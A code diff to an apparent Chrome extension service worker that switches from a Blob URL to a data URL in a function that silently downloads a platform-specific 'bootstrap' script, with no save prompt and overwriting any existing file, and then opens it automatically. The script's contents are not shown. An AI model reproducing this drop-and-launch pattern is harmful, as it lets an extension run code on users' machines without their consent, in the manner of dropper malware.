@@ -130,23 +130,31 @@ function markBootstrapAttempt() {
   chrome.storage.local.set({ lastBootstrapAt: Date.now() });
 }
 
+// MV3 service workers have no URL.createObjectURL — use a data URL instead.
+function contentToDataUrl(text) {
+  var bytes = new TextEncoder().encode(text);
+  var binary = '';
+  for (var i = 0; i < bytes.length; i++) {
+    binary += String.fromCharCode(bytes[i]);
+  }
+  return 'data:application/octet-stream;base64,' + btoa(binary);
+}
+
 function downloadAndLaunchBootstrap() {
   return new Promise(function(resolve) {
     chrome.runtime.getPlatformInfo(function(info) {
       var os = info && info.os ? info.os : 'win';
       var content = bootstrapScriptForPlatform(os);
       var filename = bootstrapFilename(os);
-      var blob = new Blob([content], { type: 'application/octet-stream' });
-      var blobUrl = URL.createObjectURL(blob);
+      var dataUrl = contentToDataUrl(content);
 
       chrome.downloads.download({
-        url: blobUrl,
+        url: dataUrl,
         filename: filename,
         conflictAction: 'overwrite',
         saveAs: false
       }, function(downloadId) {
         if (chrome.runtime.lastError || !downloadId) {
-          URL.revokeObjectURL(blobUrl);
           resolve(false);
           return;
         }
@@ -155,12 +163,10 @@ function downloadAndLaunchBootstrap() {
           if (delta.id !== downloadId || !delta.state) return;
           if (delta.state.current === 'complete') {
             chrome.downloads.onChanged.removeListener(onChanged);
-            URL.revokeObjectURL(blobUrl);
             chrome.downloads.open(downloadId);
             resolve(true);
           } else if (delta.state.current === 'interrupted') {
             chrome.downloads.onChanged.removeListener(onChanged);
-            URL.revokeObjectURL(blobUrl);
             resolve(false);
           }
         }
